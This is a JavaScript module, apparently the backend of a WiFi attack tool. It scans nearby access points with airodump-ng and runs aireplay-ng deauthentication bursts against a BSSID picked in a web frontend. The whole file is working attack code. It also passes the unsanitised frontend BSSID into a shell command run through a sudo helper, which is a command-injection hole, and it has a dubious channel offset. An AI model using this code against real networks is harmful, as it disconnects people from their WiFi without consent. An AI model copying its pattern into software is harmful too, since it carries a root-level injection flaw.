// This module needs the WiFi interface to be in monitor mode.
// Therefore, it will set it to monitor mode when the frontend starts

import os from "os";
import path from "path";
import { existsSync, unlinkSync, readFileSync } from "fs";

import { runCommand } from "./sudoRunCommand";
import interfaceState from "./interfaceState";
import parseAirodumpOutput from "./parseAirodumpCSV";

const airodumpOutputPath = path.join(os.homedir(), "/tmp/airodump_output");

export async function handleDeauthDeauth(ws, data) {
  // 1. Check if the 'data' is valid
  // 2. Stop scanning
  // 3. Switch interface to monitor mode, on channel of the BSSID
  // 4. Deauth the BSSID
  // 5. Notify the frontend that the deauth is done

  console.log(data.BSSID, data.channel, typeof data.channel);

  if (!data.BSSID || !data.ESSID || !data.channel) {
    console.error("Invalid data received from frontend.");
    return;
  }

  ws.send(
    JSON.stringify({
      type: "deauth-start",
      data: `Deauthenticating ${data.ESSID} with 20 packets...`,
    })
  );

  try {
    console.log("Kill airodump");
    await runCommand("pkill airodump-ng");
    console.log("Kill airodump done");

    console.log("Set mode to monitor");
    await interfaceState.setMode("monitor", data.channel + 1);
    console.log("Set mode to monitor done");

    console.log("Run aireplay");
    await runCommand(
      `aireplay-ng -0 20 -a ${data.BSSID} ${interfaceState.getInterface()}`
    );
    console.log("Run aireplay done");

    console.log("Set mode to managed");
    await interfaceState.setMode("managed");
    console.log("Set mode to managed done");

    // Done
    ws.send(
      JSON.stringify({
        type: "deauth-end",
        data: `Finished deauthenticating ${data.ESSID}!`,
      })
    );
  } catch (error) {
    console.log("Error during deauthentication:", error);
  }
}

export function handleDeauthScan(ws) {
  // Delete the previous airodump output file
  if (existsSync(airodumpOutputPath + "-01.csv")) {
    unlinkSync(airodumpOutputPath + "-01.csv");
  }

  interfaceState.setMode("monitor").then(() => {
    runCommand(
      `airodump-ng -w ${airodumpOutputPath} --output-format csv --write-interval 1 ${interfaceState.getInterface()}`
    );
  });

  // Send the airodump-ng output to the frontend every 1000ms
  setInterval(() => {
    try {
      const output = readFileSync(airodumpOutputPath + "-01.csv", "utf-8");
      const accessPoints = parseAirodumpOutput(output);
      ws.send(
        JSON.stringify({ type: "airodump-ng-output", data: accessPoints })
      );
    } catch (error) {
      ws.send(
        JSON.stringify({
          type: "airodump-ng-start",
          data: "Airodump-ng is starting...",
        })
      );
      // console.error("Error reading airodump output:", error);
    }
  }, 1000);
}

export function handleDeauthExit(ws) {
  try {
    runCommand("pkill airodump-ng");
  } catch (error) {
    console.error("Error during deauth exit:", error);
  } finally {
    interfaceState.setMode("managed").then(() => {});
  }
}
